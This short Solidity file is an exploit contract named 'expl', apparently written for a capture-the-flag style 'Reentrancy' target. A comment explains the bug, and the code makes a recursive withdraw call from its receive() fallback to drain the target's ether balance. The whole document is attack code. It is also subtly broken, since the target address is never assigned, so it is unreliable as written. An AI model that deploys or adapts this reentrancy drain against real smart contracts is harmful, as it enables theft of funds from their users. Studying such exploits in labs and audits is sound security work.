pragma solidity ^0.8;

interface Reentrancy {
	function donate(address _to) external payable;
	function withdraw(uint _amount) external payable;
}

// This is a classic reentrancy bug found in smart contracts
// you can simply call the withdrawl function recursively 
// as it's call is controlled by you

contract expl {
	address payable target_addr;
	Reentrancy public target = Reentrancy(target_addr);

	function pwn() public payable {
		target.withdraw(1e18);
	}

	receive() external payable {
		uint amount = 1e18 <= address(target_addr).balance
			? 1e18 : address(target_addr).balance;

		if(amount > 0) {
			target.withdraw(amount);
		}
	}
}
